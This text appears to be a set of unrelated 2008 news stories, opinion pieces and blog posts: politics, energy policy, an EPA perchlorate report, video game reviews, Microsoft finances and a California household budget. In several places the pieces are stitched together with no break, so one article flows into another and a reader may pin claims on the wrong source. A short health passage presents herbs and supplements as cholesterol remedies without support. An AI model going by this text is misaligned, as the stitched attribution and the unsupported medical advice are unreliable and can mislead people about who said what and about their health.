Indeed , after Bush willfully suspended the rights accorded prisoners of war by the Geneva Conventions , he was , in fact , officially turning the United States into an immoral nation that openly and unashamedly resorts to torture , thus violating basic rules of morality , international law and a host of international treaties adhered to by the United States .
In fact , the Geneva Conventions in its article 3 does not only prohibit torture , but also any cruel , inhuman , degrading , and humiliating treatment of a detainee “ in all circumstances . ”
However , it is not only on the issue of torture that the United States under Bush has become an international pariah .
The Bush - Cheney administration has also operated concentration camps in many countries , holding captive tens of thousands of detainees and hiding them from the Red Cross , the body empowered to monitor compliance with the Geneva Conventions .
The Bush - Cheney administration has placed itself outside the civilized world and was nearly alone , last May ( 2008 ) , in trying to undermine a treaty banning cluster bombs , a type of bombs which have killed so many civilians , when 111 countries signed a treaty outlawing these inhuman weapons .
On this occasion , the United States , under Bush - Cheney , sided with a handful of weapons makers and users , none of them known as great defenders of human rights and democracy : Russia , China , Israel , India and Pakistan .
The Bush - Cheney administration has truly been a shamelessly immoral administration .

The Conservatives are dropping their pledge to match Labour 's spending plans for 2010 / 11 , leader David Cameron says .
The Tories had promised to match the totals for Labour 's spending plans from 2008 to 2011 - subject to a review in 2009 of the 2010 / 11 spending total .
But Mr Cameron said he wanted to create a " low - tax , low - debt economy " and called on Gordon Brown to " deal with the situation he has given us " .
Labour accused the Tories of " turning their back " on people needing help now .
Chancellor Alistair Darling said Mr Cameron was out of step with the rest of the world , with other nations also planning to pump money into their economies in a " fiscal stimulus " aimed at staving off a slump .
He told BBC News : " There is a consensus , here and across the world that at this time , governments need to support people , need to support businesses and the wider economy . "
Brown ' mistake '
Mr Darling is expected to unveil a package of tax cuts and public spending in his pre-Budget report next week .
He said : " We need to be more efficient and we will be more efficient .
We are already exceeding the targets we set ourselves for government spending , in making ourselves more efficient and cutting back on waste .
Please turn on JavaScript .
Media requires JavaScript to play .
" I think we can do a lot more and on Monday , at the pre-Budget report , I will be setting out what more I think we can do . "
The Tory leadership has been under pressure from party members to outflank the government on tax cuts , but Mr Cameron ruled out any measures that could not be paid for .
He accused the prime minister of planning to " throw money at the crisis in the faint hope that this will help recovery " .
Mr Cameron said Britain was different to other nations because it already had high levels of public debt .
' Tax bombshell '
He warned that Mr Brown 's proposed " fiscal stimulus " was merely storing up tax rises for the years to come - and that a £ 30bn injection to the economy would mean an 8 % rise in income tax later .
In a shift in Conservative economic policy , he said : " To stop future tax rises , the growth rate of spending in 2010 / 11 will have to be lower than the growth rate laid out by Labour .
David Cameron has learned nothing .
It 's exactly what the Conservatives did in the 1980s
Nick Clegg , Liberal Democrats
" The growth rates of spending in the years beyond 2010 / 11 , pencilled in by the chancellor last year , are also now unsustainably high . "
He said Labour 's current spending plans were based on " heroic assumptions " about Britain 's prospects for economic recovery and the tax receipts it would generate .
Mr Cameron called on Mr Darling to use next week 's pre-Budget report to reduce his figures for spending growth beyond 2011 / 12 .
This would be the first year of a Conservative government if the party won a general election in 2010 - the latest date Mr Brown could call one .
Mr Cameron told the BBC : " I 'm saying the spending growth has got to be put back .
We need to recognise that we can not go as we are . "
He said of Mr Brown : " He 's prime minister of the United Kingdom , not of any other country .
He 's got to deal with the situation he has given us . "
' Not fools ' Shadow chancellor George Osborne said : " I think we are being honest with the British people ...
" People are not fools .
They know that Gordon Brown 's plans have to be paid for . "
But Liberal Democrat leader Nick Clegg said the Conservative announcement was " economic madness " .
He added : " David Cameron has learned nothing .
It 's exactly what the Conservatives did in the 1980s ...
" To simply slash public spending when we are heading into a recession - there 's no case for it whatsoever . "

Jesse Brown from the Canadian Broadcasting Corporation 's Search Engine has written a stirring editorial about the ways in which Canada 's internet infrastructure is being turned into second - rate cable TV by greedy telcos and incompetent regulators .
Every time I think about moving back to Canada some day , I remind myself of how miserable the national Internet infrastructure is — and how awful the big telcos are , and how weak - kneed and ass - licking the telcoms regulator is — and I realize I can't possibly move home .
The Internet 's where I live , it 's how I earn my income .
Living on Canada 's Internet would be better than living on China 's Internet , say , but that 's a pretty low bar to hurdle .
1. Last week the CRTC sided with Bell against a group of small Internet Service Providers who want to offer their customers unthrottled connections where what they download is their own business and not subject to interference .
2 . In last week 's throne speech the Conservative government renewed their intention to " modernize " Canadian copyright law .
Their effort to do so last session was Bill C - 61 , a woefully unbalanced and retrograde piece of legislation that led to the greatest citizen backlash to any proposed bill in recent memory .
Yet there has been no indication from new Industry Minister Tony Clement that a much - needed public consultation will take place .
The best he has offered is the possibility of a " slightly different " version of the bill .
3 . Twitter has just announced that they are killing outbound SMS messaging in Canada due to exorbitant and constant rate hikes from Canadian cell providers ( former Industry Minister Jim Prentice vowed to get tough on SMS price gouging , then backpeddled ) .
Cell phone rates in Canada are among the highest in the world , and the result is that mobile penetration is pathetically low and that emerging new cultural platforms like Twitter are being hobbled .
Is Canada becoming a digital ghetto ?
( Thanks , Jesse ! )

The former Gang - of - 10 compromise , which has since expanded to 16 and then 20 US Senators , proposes to swap limited offshore drilling for an increase in renewable energy support .
The Gang - of - 20 bill severely limits offshore drilling to a handful of Southeastern states that must opt in to allow increased drilling , and moves the drilling boundary to 100 miles offshore ( from its current 200 miles ) “ with states given the option to set it at 50 miles . ”
[ social_buttons ]
Some oil industry representatives question the effect of the proposals , citing federal studies that show that more than 80 % of known oil reserves are inside the 50 - mile limit and therefore unavailable .
Very little is known about oil reserves beyond 100 miles .
Waters off almost the entire Pacific coast — where all three governors oppose drilling at the 50 - mile barrier — is considered too deep for drilling 100 miles offshore .
“ You would just open a door to an empty room at the end of a very long hallway , ” said Brian Kennedy , spokesman for the Institute for Energy Research , an organization funded by the oil industry .
Kennedy also said that , without some sort of revenue sharing for state governments , there would be little incentive for states to approve additional drilling .
The compromise contains a 5 - year extension of the renewable energy tax credits , which are key to the growth of the renewable energy industry .
The bill would invest $ 84 billion in conservation and efficiency , which will be fully offset with loophole closers and other revenues .
Approximately $ 30 billion will come from new revenues from the oil and gas industry through such measures as repealing a tax break for oil companies which Democrats have long sought .
The bill also funds
A $ 20 billion “ Apollo Project ” like effort to support the goal of transitioning 85 % of America ’s new motor vehicles to non- petroleum - based fuels within 20 years ;
$ 7.5 billion for R&D focused on the major technological barriers to alternative fuel vehicles , such as advanced batteries ;
$ 7.5 billion to help U.S. automakers and parts makers re-tool and re-equip to become the world leader in making alternative fuel vehicles ;
Consumer tax credits of up to $ 7,500 per vehicle to incentivize Americans to purchase advanced alternative fuel vehicles ( those that run primarily on non-petroleum fuels ) and up to $ 2,500 to retrofit existing vehicles with advanced alternative fuel engines ;
New consumer tax credits of up to $ 2,500 to purchase highly fuel efficient vehicles , to help Americans reduce their annual gas costs and reduce oil imports ;
Extending and expanding the $ 2,500 tax credit for hybrid electric vehicles ;
$ 500 million for R&D into new materials and other innovations to improve vehicle fuel efficiency ;
$ 2.5 billion in R , D&D on next generation biofuels and infrastructure ;
Tax incentives for the installation of alternative fueling stations , pipelines and other infrastructure ;
Expanding transmission capacity for power from renewable sources ;
New dedicated funding for the weatherization assistance program ;
Provides grants and loan guarantees for the development of coal - to - liquid fuel plants with carbon capture capability .
Plants must have lifecycle greenhouse gas emissions below those of the petroleum fuels they are replacing ;
Supports nuclear energy by increasing staff at the NRC , providing workforce training , accelerating depreciation for nuclear plants , and supporting R&D on spent fuel recycling to reduce nuclear waste ;
Provides a CO2 sequestration credit for use in enhanced oil recovery to increase production from existing oil wells while reducing greenhouse gas emissions .
That ’s a pretty impressive list in exchange for just allowing a minimal amount of increased offshore drilling , although the coal - to - liquid provision is potentially environmentally dangerous .
Senate Democrats in particular are trying to pursue this “ all of the above ” energy strategy in order to force Republicans to fund renewable energy projects , which thus far they have successfully blocked .

New York Times endorses Barack Obama
Americas , Fri , 24 Oct 2008 IANS
Washington , Oct 24 ( IANS )
The influential New York Times Friday became the fourth mainstream American daily to endorse Barack Obama , saying he 'has proved that he is the right choice to be the 44th president of the United States . '
' The nation 's problems are simply too grave to be reduced to slashing ' robo - calls ' and negative ads , ' it said in an editorial Friday .
' This country needs sensible leadership , compassionate leadership , honest leadership and strong leadership .
Barack Obama has shown that he has all of those qualities .'
The New York Times endorsement of Obama comes just a week after three other leading newspapers - the Washington Post , the Chicago Tribune and the Los Angeles Times - backed the Democratic nominee over his Republican rival John McCain .
The largest daily in Obama 's hometown , the Tribune had not backed a Democrat in its 161 - year history , while the Los Angeles Times had not endorsed a presidential candidate since 1972 , when it backed President Richard M. Nixon 's re-election .
So far 39 other regional newspapers with 3.5 million readers have backed Obama .
McCain , who is lagging in the polls behind Obama , has received endorsements from 15 newspapers with 1.5 million readership , according to the industry magazine Editor and Publisher .
The New York Times said the US is battered and drifting after eight years of President George Bush 's failed leadership .
But 'as tough as the times are , the selection of a new president is easy , ' it said suggesting ' Obama has met challenge after challenge , growing as a leader and putting real flesh on his early promises of hope and change .
' He has shown a cool head and sound judgment . '
The Times said it believed Obama 'has the will and the ability to forge the broad political consensus that is essential to finding solutions to this nation 's problems . '
On the other hand , McCain 'has retreated farther and farther to the fringe of American politics , running a campaign on partisan division , class warfare and even hints of racism . '
It said .
' His policies and worldview are mired in the past .
His choice of a running mate so evidently unfit for the office was a final act of opportunism and bad judgment that eclipsed the accomplishments of 26 years in Congress , ' the Times said .
' McCain 's long interest in foreign policy and the many dangers this country now faces make his choice of Alaska Governor Sarah Palin more irresponsible , ' it said .
' Obama would have a learning curve on foreign affairs , but he has already showed sounder judgment than his opponent on these critical issues , ' the influential daily said .
' His choice of Senator Joseph Biden - who has deep foreign - policy expertise - as his running mate is another sign of that sound judgment . '
Both presidential candidates talk about strengthening alliances in Europe and Asia , including NATO , strongly support Israel and talk about repairing America 's image in the world , it said .
' But it seems clear to us that Obama is far more likely to do that - and not just because the first black president would present a new American face to the world , ' the Times said .
Both candidates talk tough on terrorism , and neither has ruled out military action to end Iran 's nuclear weapons programme , it said .
' But Obama has called for a serious effort to try to wean Tehran from its nuclear ambitions with more credible diplomatic overtures and tougher sanctions , ' the Times said suggesting ' McCain 's willingness to joke about bombing Iran was frightening .'
Crude - oil prices sank below $ 50 a barrel , and the average cost of a gallon of gasoline at the pump hovered just above $ 2 , a free fall in prices that is reverberating through the economy .
The sudden reversal -- the fastest and sharpest since 1980 , when the government began tracking monthly gasoline prices -- is bringing relief to some and complicating business for others .
Tumbling energy prices led October 's 1 % decline in consumer prices , deepening concerns about a long recession .

Cayenne , Hawthorn Berries , and Goldenseal are especially useful for lowering cholesterol .
B6 , B12 , and Folic Acid helps to lower damaging homocysteine levels .
When the body 's stores of B6 ( pyridoxine ) , folic acid and B12 are depleted , homocysteine can rise to abnormal levels and lead to a much greater risk of heart attack .
Niacin ( B3 ) , guggul , artichoke leaf , fiber , and red yeast rice are also excellent natural solutions for those with high cholesterol .
Red yeast rice is a supplement thought to work like the popular " statin " drugs , so it should be taken alongside CoQ10 .
Ultimately , the best natural solution for those with high cholesterol is to make positive lifestyle changes .
Get regular physical activity , maintain a healthy weight , eat low cholesterol foods , quit smoking , drink alcohol in moderation ( if at all ) , manage stress , consume plenty of fiber , and drink plenty of fresh organic juices .

Lower Cholesterol Level Presentsby Robin ReichertLower Cholesterol Level
WASHINGTON - The Environmental Protection Agency , under pressure from the White House and the Pentagon , is poised to rule as early as today that it will not set a drinking water safety standard for perchlorate , a component of rocket fuel that has been linked to thyroid problems in pregnant women , newborns , and young children across the nation .
According to a near - final document obtained by the Washington Post , EPA 's " preliminary regulatory determination " - which was extensively edited by White House officials - marks the final step in a six - year battle between career EPA scientists who advocate regulating the chemical and White House and Pentagon officials who oppose it .
The document estimates that up to 16.6 million Americans are exposed to perchlorate at a level many scientists consider unsafe ; independent researchers , using federal and state data , put the number at between 20 million and 40 million .
Some perchlorate occurs naturally , but most perchlorate contamination in US drinking water stems from improper disposal at rocket test sites , military bases , and chemical plants .
A nationwide cleanup could cost hundreds of millions , if not billions , of dollars , and several defense contractors have threatened to sue the Defense Department to help pay for it if one is required .
The new EPA proposal - which assumes the maximum allowable perchlorate contamination level is 15 times above what EPA suggested in 2002 - was heavily edited by officials of the White House Office of Management and Budget who edited out key scientific passages and asked EPA to use a new computer modeling approach to calculate the chemical 's risks .
Under a process OMB initiated in 2004 , federal agencies with an interest in chemicals such as perchlorate , such as the Defense Department , have additional opportunities to influence EPA 's regulatory decisions before they become final :
The Government Accountability Office reported this spring that the Pentagon had pressured EPA for several years not to regulate perchlorate .
" They have distorted the science to such an extent that they can justify not regulating " the chemical , said University of Massachusetts professor Robert Zoeller , an endocrinologist who specializes in thyroid hormone and brain development and who has a copy of the EPA proposal .
" Infants and children will continue to be damaged , and that damage is significant . "
Zoeller noted that scientific studies have shown a small reduction in thyroid function in infants can translate into a loss of IQ and an increase in behavioral and perception problems .
" It 's absolutely irreversible , " he said .
" Even small changes in thyroid functions early on have impacts on functioning through high school and even into people 's 20s . "
A reference to those studies in EPA 's proposal was deleted by OMB officials .
The document states that establishing a drinking water standard for perchlorate " would not present a ' meaningful opportunity for health risk reduction for persons served by public water systems . ' "
In a statement yesterday , EPA 's assistant administrator for water Benjamin Grumbles said " science , not the politics of fear in an election year , will drive our final decision . "

It does n't surprise me that the video game industry is so far defying the consumer confidence crisis .
On a cost - per - minute basis , games are one of the best entertainment values around .
I 've recently been playing the first Rainbow Six Vegas game with a friend , and when something happened to the disc with five levels left to go , I was reluctant to spend $ 12 on a used replacement copy ... until I realized that we were talking about less than $ 2.50 per level .
Not bad for an en evening of entertainment for two people ( four , if you count how much fun our wives have rolling their eyes at us ) .
Still , I wo n't spend quite as freely on games as some people ( which is I 'm only playing RSV1 now , after it became widely available used ) .
So I 'm looking over the big draws for the holiday season and not feeling terribly confident about any of them .
Little Big Planet .
Maybe I 'm getting old , but I do n't want to design my own games any more than I want to shoot my own movies .
( I do n't even particularly want to write my own books , but that 's another story . )
I get the appeal of LBP to other people , but I do n't have hours to spend building levels ( or vehicles , Banjo / Kazooie ) , and if I did , I would n't really get a kick out of sharing them with strangers .
Fallout 3 . This is at the top of my list .
I loved the earlier Fallout games ( though this one is n't by the same folks ) and I usually like big RPGs .
Plus I 'm a sucker for the post - apocalyptic in a way I 'm not for swords and sorcery .
The problem is , I got burned on Mass Effect , which turned out , despite the genuinely awesome new dialog interface , to be a tedious slog with impenetrable resource management .
Games are only cost - effective if you actually spend 40 - 100 hours playing them .
Positive reviews like this one worry me when they compare it to " a sightseeing trip . "
I do n't mind a slowly - developed story , as long as it's interesting the whole way .
And the problem with a game like this is that you can't rent it for a night to see if you like it , since it really takes at least a few days to know for sure ( yeah , I know some people do weekend - long marathons .
I do n't ) .
Of all the games out now , this is the one I 'm most likely to take a gamble on .
Fable 2 . I know people love the concept , but to me it has even greater potential for not being terribly fun as an actual game .
Zero Punctuation 's Yahtzee ( about the only critic I trust since Charles Herold left the Times ) stokes my fears .
Mirror 's Edge .
I played the demo last night and I totally get it .
It reminds me of the first time I played Spider - Man 2 in the sense of providing the excitement of a completely new and remarkably compelling movement mechanic .
Except that web - slinging was fast and fun .
You felt like you were swinging through buildings .
ME has clearly been intentionally designed to feel like hard work ( right down to the heavy breathing ) .
I suppose that 's a better simulation of the parkour experience , I just personally want something a touch more superhuman .
Also , I 'm a bit worried about the learning curve , and the reviews saying that other than the novel travel style , it 's not much of a game ( much like Spider - Man 2 ) .
Spider - Man : Web of Shadows .
Because I did love S - M2 and this reportedly does have a solid game attached to it .
But the reviews have been mixed .
I 'll need a demo or a rental .
Left4Dead .
Another demo I played last night .
Holy crap was it fun .
It took the feel of my favorite FPS , Half - Life 2 , stuck it in a present - day zombie infested city , and cranked up the adrenaline several notches .
The problem is , it 's designed from the ground - up for online multiplayer , and I just do n't do that .
I know , it 's the future of gaming and everything , so maybe this is another generational thing .
I would love to play L4D online with actual friends ( as opposed to asshole teenagers ) but I do n't have many actual friends on XBL , so this game is , sadly , out .
Dead Space .
Another game I 've heard good things about .
Charles Herold was even tentatively positive about it after a few levels .
But what did Yahtzee say ?
What do you think ?
This is definitely one I 'll rent first .
Gears of War 2 .
I did n't like the first one .
Too much work , not enough brains .
End War .
Downloaded the demo , but could n't bring myself to play it .
The very idea of talking to the game turned me off .
I 'll try it when I 'm in a different frame of mind .
Soul Caliber IV .
Again , I need something with more single - player appeal .
Definitely when the price drops , though .
Portal : Still Alive .
Argh .
I hate the idea of paying for a game I already have .
But then again , it 's easily one of the best games I 've ever played .
And with 14 new levels that 's just a little more than a dollar per level ...
Anything I 'm leaving out ?

Microsoft 's burgeoning online strategy is beginning to feel the spending pinch as the company battens down against a potential recession .
The company said it 's " pulling back spending in lower priority areas " including the rollout of data centers , along with reduced hiring , marketing and travel spending .
Chris Liddell , Microsoft 's chief financial officer , said Thursday the goal is to reduce capital expenditures this year by $ 300 m , " mostly in the data center side " .
He added : " Each division has had lower - priority spending taken out " on marketing and people related expenses like travel .
It 's the first sign Microsoft is cutting costs in non-core areas and re-ordering its priorities to focus on the core .
Data centers are a key to Microsoft 's online strategy , and the company has spent millions of dollars this year rolling out the centers to support its cloud - computing initiative .
All that spending , though , has meant losses and increased costs associated with any revenue that it does earn .
Losses more than doubled suddenly in the summer 's fourth quarter while revenue has fallen each quarter since January .
For the first fiscal quarter , announced Thursday , Microsoft 's online business revenue was up 14 per cent year on year but down eight percent compared to the summer 's fourth quarter .
Losses were also up year on year - 81 per cent to $ 480 m - but down fractionally against the fourth - quarter 's loss of $ 488 m .
Cost of revenue in the first quarter grew $ 183 m or 47 per cent , " primarily driven by increased data center and equipment costs , online content expenses and agency expenses , " Microsoft said .
Sales and marketing expenses increased $ 54 million or 23 per cent , and research and development $ 54 million or 19 per cent - largely due to increased " staff - related expenses " . ®
I have n't expressed an opinion about the McCain supporter allegedly beaten up for her political views , because it seemed likely that she had made it up , but I did n't want to risk piling on an actual victim .
Now we know : it was a fantasy .
I 'm sure some bloggers will cast this as a dark Republican conspiracy , or somehow symptomatic of conservatism .
In reality , AFAIK , faked hate crimes are usually faked by left wing causes , if only because the left has more groups who can realistically complain of attack .
But while a few of them have been faked by student groups looking for attention , as far as I can tell the overwhelming majority are disturbed people looking for attention from their ideologically supportive peers , or , a la Tawana Brawley , trying to get out of some other trouble .
It is n't " symptomatic " of the fight for racial equality or gay rights that some sad members of those movements engage in false accusations ; it 's symptomatic of the fact that some people will do anything to feel important .
I expect the same applies here .
It tells us something about Sarah Palin 's homage to small - town America , delivered to an enthusiastic GOP convention last week , that she chose to fire it up with an unsourced quotation from the all - time champion of fake populism , the belligerent right - wing columnist Westbrook Pegler .
" We grow good people in our small towns , with honesty and sincerity and dignity , " the vice - presidential candidate said , quoting an anonymous " writer , " which is to say , Pegler , who must have penned that mellifluous line when not writing his more controversial stuff .
As the New York Times pointed out in its obituary of him in 1969 , Pegler once lamented that a would - be assassin " hit the wrong man " when gunning for Franklin Roosevelt .
There 's no evidence that Mrs. Palin shares the trademark Pegler bloodlust -- except maybe when it comes to moose and wolves .
Nevertheless , the red -state myth that Mrs. Palin reiterated for her adoring audience owes far more to the venomous spirit of Pegler than it does to Norman Rockwell .
Small town people , Mrs. Palin went on , are " the ones who do some of the hardest work in America , who grow our food and run our factories and fight our wars . "
They are authentic ; they are noble , and they are her own : " I grew up with those people . "
But what really defines them in Mrs. Palin 's telling is their enemies , the people who supposedly " look down " on them .
The opposite of the heartland is the loathsome array of snobs and fakers , " reporters and commentators , " lobbyists and others who make up " the Washington elite . "
One of the challenges during this economic crisis is budgeting .
As much as we hear about the housing collapse or the stock market seesawing like a playground , we rarely get a glimpse into the actual budget of real live Americans .
Sure we know housing is expensive .
We all intuitively knew that $ 147 a barrel oil was not going to be good on our economy .
But how does this translate into the monthly budget of a family trying to get by ?
A few months ago I put together a budget for a family / person living on $ 46,000 a year here in California .
Many people doubted this was even possible .
It is possible because I based the data from friends and family members that live on this amount .
I had requests to put together a budget for a family in the middle to upper - middle class .
Today we are going to look at a detailed budget I put together for a family making $ 100,000 a year and trying to live here in California .
Let us look at the budget :
Let us go line by line and discuss each specific area .
This budget is based on a family trying to live here in California .
We ’ll also show areas we can trim down to make up for the monthly deficit they are running .
401k
We are putting away $ 1,000 per month into our 401k plan .
Many right now may be questioning why we would even do that given the poor market conditions .
Keep in mind that many funds allow you to put money away into savings funds that bring in 3 or 4 percent per year but are guaranteed .
In addition , this money is pre-tax so you have more money to invest thus boosting your savings power .
I ’d be cautious about what funds to invest in given the current climate .
If you are not sure just put it into a savings fund until you have a better idea .
Mortgage Debt
I ’m basing this off the median home price in Los Angeles which is $ 355,000 .
That is for a basic starter home .
You can now find a “ nice ” place for $ 400,000 .
So let assume this couple bought a nice $ 400,000 home here in Los Angeles County .
They now have a mortgage of $ 350,000 and put down $ 50,000 which is about how much you need in today ’s tight credit market .
Let us now go through the line items for each expense .
Mortgage Payment
At 6 % on a 30 year fixed note , they are looking at a $ 2,098 payment simply for principal and interest .
Real Estate Taxes
In California , many of the nicer areas have city taxes on top of the state tax which is low hovering around 1 % .
With the additional items you are paying about 1.25 % to 1.75 % on the very high end .
With taxes are payment is now up to $ 2,499 .
Throw in insurance and you are looking at $ 2,574 .
Gas
I ’ve averaged out gas payments for a family that does cooking and also uses internal heaters during the winter ( which are mild here in California ) .
You may find this line item different for your family .
Electric
For electric we are spending $ 125 per month .
This is about right if you consider a household that has a child and an income of $ 100,000 probably also has the typical suburban amenities .
Televisions , computers , and other items do suck electricity .
Again , you may find this item lower on your budget .
Phone
A basic land line with the ability to call long distance will cost you anywhere from $ 30 to $ 40 a month .
Many people are cutting this out and going strictly with a cell phone .
This family chooses to have a landline . [ save $ 30 ]
Cable
A basic cable package will cost $ 65 .
Many people spend upwards of $ 100 to $ 150 a month on cable programming .
I think that is a waste to go beyond the basic cable but this is where folks spend their hard earned money .
This is an item we can completely trim out .
[ save $ 65 ]
Internet
DSL or cable modem coverage will cost you about $ 40 a month .
Most people now go with broadband for the home so this may be a necessity especially if you use the computer for work at home .
Not much to trim here .
You can go with “ naked dsl ” which is service without the phone or cable attached but it may be limited in your area .
Cell Phone
A basic cell phone plan will cost you $ 50 a month .
If you get an iPhone or Blackberry expect to pay $ 100 or more a month for decent service .
You can get a pre-paid phone from Virgin Mobile or T - Mobile and they usually do n’t even require a credit card .
I know with Virgin Mobile , you can pay as little as $ 10 a month for service .
House Insurance
We already factored this item above .
In California this may increase if you are looking at fire or earthquake insurance .
Car Insurance
For car insurance , we have a family with 2 cars and good driving records .
They have modest cars and have full coverage on both .
Assuming they are in their 30s we are looking at $ 150 a month .
Keep in mind this is for modest cars .
Life Insurance
A person with a family should definitely not skimp on this item .
It is important to ensure your family is covered no matter what .
For a younger couple , this should n’t be too expensive .
Disability Insurance
Given the tough economic climate , you ’d be smart to have some disability insurance in case something happened to you on the job and you were unable to find work for some time .
Again , this should be minimal if you are younger but the premium will increase with age .
Health Insurance
This is where it can get tricky and prices are all over the map .
You can get a basic packaged for $ 250 a month but this is barebones .
There is n’t much we can cut here but if your employer covers this , you can find savings here .
Medical and Dental
We ’ll throw in co-pays and dental visits here .
In this assumption we have your employer covering your dental insurance but a lot of coverage is basic and you ’ll have to have a deductible .
Groceries
For a family of 3 you can get by on $ 550 a month .
I know in the previous budget people flipped out and said that it was impossible .
Well yeah , if you are shopping purely at Trader Joes .
Here in L.A. we are lucky to have great diversity in our stores .
You can find great deals and many other local markets have great cuts of meat and much better prices .
You may need to shop at 2 or even 3 stores .
Car Payments
We are assuming the couple has 2 cars they are still paying .
Let us say a Civic and a Focus .
The payments are slightly above $ 250 for each car .
If they accelerate and pay the cars off , this will be a net savings of $ 525 .
My suggestion for a young couple with this level of income is hold off on the luxury car and buy a nice used car .
This is so crucial .
The big mistake in L.A. many people make especially when they have a low 6 figure income is they buy a very expensive luxury car .
Well that pushes up your payment , insurance , and gas .
Many people spend $ 1,000 to $ 1,500 a month simply on one car !
Insanity .
Potential savings here .
[ save $ 525 ]
Automobile Gas
Gas has dropped quickly due to the collapse of the oil markets .
Now , you can get a gallon of gas for $ 2 a gallon .
So with the recent knock down in gas we can say that this family will spend $ 200 a month on gas .
With a Civic and Focus that is enough .
[ save $ 100 ]
Work lunch / Incidentals
If you are really frugal , you ’d price in your brown bag lunch from your grocery budget .
This family is spending $ 125 a month on eating lunch at work .
This can easily be shaved down .
[ save $ 125 ]
Household Items
This is for things like vacuums , furniture , and other items that go in your home .
Over time these do add up .
For example you do need a microwave and stove .
So over a year you are looking at spending say $ 225 a month .
A new refrigerator will cost you $ 800 to $ 1,000 .
At least a good one will cost you that much .
So this outlay is only for the first few years and should taper off .
We can assume this couple is new to their home and needs new items .
Next year , they ’ll need to close that deficit so they ’ll need to cut back here at least by $ 125 . [ save $ 125 ]
Clothes
People in L.A. love shopping so this is hard to resist for many .
We are allocating $ 150 per month here .
Some people want to dress their kid in GQ clothes but they really do n’t care or even realize what they are wearing .
Many times the clothes are more a reflection of the parent ’s wants and desires .
Cut this back by $ 50 a month . [ save $ 50 ]
Household Maintenance
Owning a home is expensive .
Anyone that owns property knows this .
The toilet screws up .
You need a new roof .
You kick the door down after partying too hard .
Yeah , things like that come up all the time .
So this budget allocation seems about right .
It is n’t monthly but keep in mind a roof can cost you $ 5,000 so for 2 years that works out to be $ 208 per month .
Entertainment
Okay , this is much too high here .
You like movies ?
Hook yourself up with Netflix for 9 bucks a month and you ’ll be able to get as many movies as you like .
Do you really need to buy every DVD you see ?
Free museums , gorgeous beaches , and nice parks are all over L.A. County .
Use those .
If you have a deficit you can certainly cut back here .
Yes , you ’ll go out and have a nice meal and watch movies .
So we wo n’t be draconian but let us cut this in half .
[ save $ 250 ]
Charity
I ’m a believer that you should give a little bit each month to those less fortunate .
Some may have religious requirements here so this will vary .
But my feeling is a family with a $ 100,000 income has a bit of wiggle room to help others .
Pet Expenses
Pets are expensive especially dogs .
Vet bills and food are additional costs .
If you have no pet , this is easy to save but many families here have pets so we ’ll leave this line item .
Dry Cleaning
If you work in a professional environment , you may need to have some of your suits dry cleaned .
Understandable .
Just do n’t take your Metallica t- shirt here .
$ 50 is plenty for once or twice a month service on important items .
Personal Care
Let us be honest that the genders are not equal here .
For guys , a basic haircut is cheap .
For the ladies not so much .
So this area will vary .
If your bald hey , you ’ve just saved some dough here .
Vacations
Working families like to take vacations .
I ca n’t believe how some people in this income range take $ 20,000 vacations and put it on their credit card .
Absurd .
That is why even these people are going broke .
We are saving $ 250 per month for a nice mini vacation per year .
$ 3,000 should go a long way here .
You wo n’t be going to Monte Carlo but a $ 100,000 income is n’t enough to take that trip anyways .
$ 3,000 can be a great camping trip / equipment , a nice week long cruise , a flight to a nice place in the United States .
You get the picture .
Gifts
Birthdays , Christmas , and other holidays .
This family is spending a little too much here given their monthly deficit .
Let us cut this back by $ 50 per month .
This still gives them $ 900 a year to spend on gifts . [ save $ 50 ]
Total Savings Above
With very modest cuts above , we were able to trim $ 1,195 from the budget , plenty enough to cover the deficit of $ 1,026 .
These were n’t even draconian cuts .
You can trim more money but I ’ll leave that up to you .
The point is , many people that I know are within this range and struggle but it is because they have cars that are too expensive or bought homes that they simply could not afford .
$ 100,000 does not go far in Los Angeles .
This family above is comfortable but they certainly are n’t living like Trump .
Hopefully this gives you an idea on how to budget .
If you live in an expensive area yet make the median income of $ 46,000 please take a look at the budget I put together for that .
People need to be realistic and live within their means .

Three weeks ago Greg and I attended a Gears of War 2 press event in London .
A dozen or so journalists were put up in the St Martins Lane hotel near Trafalgar Square and allowed to play the game all night .
The multiplayer modes were running downstairs in a large conference suite , but we also had an Xbox 360 and a copy of the game in each of our own rooms .
The results were embargoed until today .
Here 's what I took from my ten or so hours with the game .
Greg 's point - of - view will be different , I 'm almost certain .
This is n't a review , because I did n't finish it , it 's a sort of first response , written a day afterwards .
Just to give you a hint : I bloody loved it .
At the beginning of Gears of War 2 , humanity is n't so much on its knees as face down in the space dust , with a Locust foot pressing on its skull .
The remnants of the population are hiding out in Jacinto , the only city that the alien hordes can't burrow under .
But here , survivors are being eaten away by a new pest – a disease known as rust lung , caused by the Lightmass Bomb detonation at the close of the first game .
And this is by no means the last moment where humanity must face up to the consequences of its own actions .
Weirdly for such a visceral , balls - out blaster , the value of human existence provides a bit of an ongoing theme , lurking in the background as you chainsaw aliens to pieces .
Right at the start of the action a politician delivers a stirring speech to the gathered gears , lamenting mankind 's atavistic need to fight , but then insisting that the only way forward is a counter - offensive against the Locust masses , taking the battle into their subterranean homeland .
And that 's your job in Gears of War 2 , inhabiting the blood - splattered boots of Marcus Fenix and leading Delta squad into the unknowable underground hell .
But as you go through the game , both the nature of the Horde and the attempts to ' save ' humanity are brought into question .
Someone somewhere has a hidden agenda and your military commanders are keeping it from you .
There 's something rotten in the state of Jacinto ; there have been … experiments .
In general , though , you 're pretty much where you were in Gears of War : fighting your way through an obliterated landscape , facing greater numbers of ever more vicious and heavily armed Horde monsters .
This is everything you loved about Gears of War , polished , heightened and exaggerated .
The visuals are amazing , not just for the incredible design detail – the charred landscapes , the devastated research stations covered in rust and broken glass , the weird alien vegetation – but for the extraordinarily accomplished use of dramatic lighting .
Gun metal glistens and glints , while looming shadows swallow lurking enemies whole and explosions sear your retinas like burning phosphorus .
It 's a brilliantly solid , gritty world – like a war documentary , filmed on a camcorder by terrified soldiers .
The pace is relentless .
One minute you 're ricocheting down a valley manning the gun turret on a massive tunneling rig , the next you 're blasting into the depths of the earth aboard a hideously dangerous grind lift .
Levels mix claustrophobic tunnels with vast chambers , often allowing you glimpses of far - off locust battalions as they swarm in your direction - or toward stricken comrades .
Guns , as in the first game , feel perfect , with semi-automatic rifles providing measured , controllable fire , while shotguns splatter death across the walls .
A couple of things , though .
While the cover system has obviously been improved and tends to work well , there are still a few fiddly moments .
Encasing the run option within the cover mechanism can make things tricky , because while running , Marcus has a really wide turn circle – not great for navigating labyrinthine tunnels at speed .
